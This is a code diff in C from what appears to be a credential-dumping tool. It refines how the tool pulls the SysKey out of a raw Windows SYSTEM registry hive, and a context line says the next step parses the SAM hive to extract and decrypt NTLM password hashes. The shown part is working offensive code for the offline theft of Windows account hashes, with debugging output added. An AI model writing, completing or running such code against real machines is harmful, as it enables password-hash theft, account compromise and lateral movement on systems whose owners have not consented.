@@ -26,19 +26,72 @@ static BOOL GetRegValue(PBYTE hive, SIZE_T size, PWSTR name, PBYTE* val, PDWORD 
     return FALSE;
 }
 
+// ─── Same as GetRegValue but scoped to a window [start, end) ───
+static BOOL GetRegValueIn(PBYTE hive, SIZE_T size, PWSTR name,
+    SIZE_T start, SIZE_T end, PBYTE* val, PDWORD valSize, PSIZE_T foundAt) {
+    SIZE_T nl = wcslen(name) * 2;
+    if (end > size) end = size;
+    for (SIZE_T i = start; i + nl + 0x18 < end; i++) {
+        if (*(PWORD)(hive + i) != 0x6B76) continue; // "vk" signature
+        if (*(PWORD)(hive + i + 2) != nl) continue;
+        if (memcmp(hive + i + 0x14, name, nl) != 0) continue;
+        DWORD ds = *(PDWORD)(hive + i + 4);
+        DWORD off = *(PDWORD)(hive + i + 8);
+        DWORD abs = 0x1000 + off + 4;
+        if (ds > 0x1000 || abs + ds > size) continue;
+        *val = (PBYTE)malloc(ds + 4);
+        if (!*val) return FALSE;
+        memcpy(*val, hive + abs, ds);
+        *valSize = ds;
+        if (foundAt) *foundAt = i;
+        return TRUE;
+    }
+    return FALSE;
+}
+
 // ─── Extract SysKey from SYSTEM hive ───
+// The four SysKey values (JD, Skew1, GBG, Data) sit together under the Lsa key.
+// Searching the whole file by name alone can hit unrelated values named "Data",
+// so we require all four within a 4KB window after the JD cell.
 static BOOL ExtractSysKey(PBYTE sysData, SIZE_T sysSize, BYTE sysKey[16]) {
     const WCHAR* vals[] = { L"JD", L"Skew1", L"GBG", L"Data" };
+    SIZE_T nl0 = wcslen(vals[0]) * 2;
     BYTE raw[16] = {0};
-    for (int i = 0; i < 4; i++) {
-        PBYTE d = NULL; DWORD s = 0;
-        if (!GetRegValue(sysData, sysSize, (PWSTR)vals[i], &d, &s) || s < 4) {
-            if (d) free(d); return FALSE;
+
+    for (SIZE_T i = 0; i + nl0 + 0x18 < sysSize; i++) {
+        if (*(PWORD)(sysData + i) != 0x6B76) continue;
+        if (*(PWORD)(sysData + i + 2) != nl0) continue;
+        if (memcmp(sysData + i + 0x14, vals[0], nl0) != 0) continue;
+        if (*(PDWORD)(sysData + i + 4) != 4) continue; // JD is exactly 4 bytes
+
+        BOOL ok = TRUE;
+        for (int k = 0; k < 4 && ok; k++) {
+            PBYTE d = NULL; DWORD s = 0;
+            if (!GetRegValueIn(sysData, sysSize, (PWSTR)vals[k], i, i + 4096, &d, &s, NULL)) {
+                ok = FALSE; break;
+            }
+            if (s < 4) { ok = FALSE; free(d); break; }
+            memcpy(raw + k * 4, d, 4);
+            free(d);
         }
-        memcpy(raw + i * 4, d, 4); free(d);
+        if (ok) {
+            for (int k = 0; k < 16; k++) sysKey[k] = raw[g_SysKeyPerm[k]];
+            return TRUE;
+        }
     }
-    for (int i = 0; i < 16; i++) sysKey[i] = raw[g_SysKeyPerm[i]];
-    return TRUE;
+
+    // Diagnostics: where is each value, for the next round of debugging
+    for (int k = 0; k < 4; k++) {
+        PBYTE d = NULL; DWORD s = 0; SIZE_T pos = 0;
+        if (GetRegValueIn(sysData, sysSize, (PWSTR)vals[k], 0, sysSize, &d, &s, &pos)) {
+            wprintf(L"      [i] %s: first match at 0x%llX size=%d\n",
+                vals[k], (unsigned long long)pos, s);
+            free(d);
+        } else {
+            wprintf(L"      [i] %s: NOT FOUND\n", vals[k]);
+        }
+    }
+    return FALSE;
 }
 
 // ─── Parse SAM: extract and decrypt NTLM hashes ───
